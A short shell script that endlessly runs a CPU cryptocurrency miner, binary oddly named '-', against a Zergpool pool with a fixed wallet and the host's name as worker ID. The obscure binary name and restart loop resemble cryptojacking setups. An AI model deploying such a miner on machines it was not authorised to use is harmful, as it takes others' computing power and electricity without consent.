pool="stratum+tcp://cpupower.mine.zergpool.com:4250"
wallet="CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk"
workername="$(cat /proc/sys/kernel/hostname)"
while [ 1 ]; do
./- -a cpupower -o $pool -u $wallet.$workername -p=c=CPU,mc=CPU
sleep 5
done
